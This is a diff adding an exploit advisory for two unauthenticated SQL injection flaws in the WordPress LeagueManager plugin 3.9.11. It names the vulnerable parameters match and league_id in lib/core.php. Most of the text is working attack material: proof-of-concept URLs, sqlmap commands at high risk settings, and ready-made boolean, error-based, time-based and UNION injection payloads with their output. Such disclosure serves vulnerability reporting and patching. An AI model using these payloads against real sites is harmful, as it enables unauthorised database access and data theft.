@@ -1,0 +1,95 @@
+###################################################################################################
+# Exploit Title: WordPress LeagueManager SQLi
+# Version: 3.9.11
+# Vendor: https://wordpress.org/plugins/leaguemanager
+# Software Link: 
+https://downloads.wordpress.org/plugin/leaguemanager.3.9.1.1.zip
+# Author: javabudd
+# Date: 06/01/2015
+# Tested on: Linux | Windows
+###################################################################################################
+
+Vulnerabilities (2)
+==========================
+
+(1) Unauthenticated SQLi [CWE-89]
+
+CODE:
+lib/core.php (785)
+++++++++++++++++++++++++++
+function getMatch() is passed an unsanitized $match_id parameter to the 
+SQL query
+++++++++++++++++++++++++++
+
+POC:
+http://localhost/?match=1
+
+SQLMap
+++++++++++++++++++++++++++
+python sqlmap.py --url "http://localhost/?match=1" --level 5 --risk 3 
+--dbms mysql
+++++++++++++++++++++++++++
+---
+Parameter: match (GET)
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: match=1 AND 3991=3991
+
+Type: error-based
+Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP 
+BY clause
+Payload: match=1 AND (SELECT 8344 FROM(SELECT 
+COUNT(*),CONCAT(0x7178717671,(SELECT 
+(ELT(8344=8344,1))),0x717a707a71,FLOOR(RAND(0)*2))x FROM 
+INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+Type: AND/OR time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+Payload: match=1 AND (SELECT * FROM (SELECT(SLEEP(5)))LCcI)
+
+Type: UNION query
+Title: Generic UNION query (NULL) - 20 columns
+Payload: match=-9496 UNION ALL SELECT 
+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178717671,0x4945496f7a7062675158,0x717a707a71),NULL--
+---
+[02:18:52] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.5.20, Apache 2.4.10
+back-end DBMS: MySQL 5.0
+
+(2) Unauthenticated SQLi [CWE-89]
+
+Code:
+lib/core.php (486)
+++++++++++++++++++++++++++
+function getLeague() is passed an unsanitized $league_id parameter from 
+the constructor
+++++++++++++++++++++++++++
+
+POC:
+http://localhost?season=1&league_id=1&match_day=1&team_id=1
+
+SQLMAP
+++++++++++++++++++++++++++
+python sqlmap.py --url 
+"http://localhost?season=1&league_id=1&match_day=1&team_id=1" --dbms 
+mysql --level 5 --risk 3 -p league_id
+++++++++++++++++++++++++++
+---
+Parameter: league_id (GET)
+     Type: error-based
+     Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or 
+GROUP BY clause (EXTRACTVALUE)
+     Payload: season=1&league_id=1' AND 
+EXTRACTVALUE(4330,CONCAT(0x5c,0x7178717671,(SELECT 
+(ELT(4330=4330,1))),0x717a707a71)) AND 'SOeQ'='SOeQ&match_day=1&team_id=1
+
+     Type: AND/OR time-based blind
+     Title: MySQL <= 5.0.11 AND time-based blind (heavy query)
+     Payload: season=1&league_id=1' AND 
+9638=BENCHMARK(5000000,MD5(0x54624c4e)) AND 
+'GmZI'='GmZI&match_day=1&team_id=1
+---
+[03:31:55] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.5.20, Apache 2.4.10
+back-end DBMS: MySQL 5.1
+
